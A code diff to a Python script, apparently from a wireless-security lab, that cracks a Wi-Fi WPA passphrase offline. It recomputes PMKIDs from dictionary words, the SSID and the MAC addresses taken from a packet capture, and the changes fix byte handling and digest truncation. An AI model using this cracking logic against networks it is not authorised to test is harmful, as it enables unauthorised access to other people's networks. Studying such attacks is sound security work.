@@ -61,10 +61,11 @@ def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
             # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
             pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
             # calculate pmkid
-            pmkid_guess = hmac.new(pmk, f"{const}{mac_ap}{mac_sta}".encode(),  hashlib.sha1)
-            pmkid_guess = bytes(pmkid_guess.hexdigest(), "utf-8")
+            data = const + mac_ap + mac_sta
+            pmkid_guess = hmac.new(pmk, data,  hashlib.sha1)
+            pmkid_guess = bytes(pmkid_guess.hexdigest(), "utf-8")[:-8]
 
-            print(f"\r{passphrase.decode():20} = {pmkid_guess}          ", end="", flush=True)
+            print(f"\r{passphrase.decode():22} = {pmkid_guess}          ", end="", flush=True)
 
             if pmkid_guess == pmkid_expected:
                 print("")
@@ -85,9 +86,11 @@ def find_ssid(ap_mac, packets):
 
 def main(pcap_file, dictionary):
     # Read capture file -- it contains beacon, authentication, association, handshake and data
+    print("Reading the file...", end="", flush=True)
     wpa = rdpcap(pcap_file)
+    print("OK")
 
-    print("Finding Handshake packet...", end="")
+    print("Finding Handshake packet...", end="", flush=True)
     p = get_pmkid_packet(wpa)
     print("OK")
 
@@ -102,11 +105,11 @@ def main(pcap_file, dictionary):
     ap_mac = a2b_hex(ap_mac.replace(':', ''))
     sta_mac = a2b_hex(p.addr1.replace(':', ''))
 
-    const = "PMK Name"
+    const = b'PMK Name'
 
 
     print("Values used to calculate PMKID:")
-    print("PMKID:       ", pmkid)
+    print("PMKID:       ", b2a_hex(pmkid))
     print("AP Mac:      ", b2a_hex(ap_mac))
     print("CLient Mac:  ", b2a_hex(sta_mac))
     print("SSID:        ", ssid)
